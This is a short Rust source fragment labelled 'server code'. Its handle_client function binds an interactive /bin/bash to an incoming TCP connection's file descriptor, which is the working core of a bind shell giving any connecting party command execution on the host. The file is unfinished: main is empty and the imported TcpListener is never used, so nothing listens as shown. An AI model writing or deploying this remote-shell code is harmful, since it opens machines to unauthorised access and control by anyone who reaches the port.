use std::net::{TcpStream, TcpListener};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use std::thread;

/**
 * server code
 */
fn handle_client(stream: TcpStream) {
    let fd = stream.as_raw_fd(); 

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait() 
        .unwrap();
    
}

fn main() {

}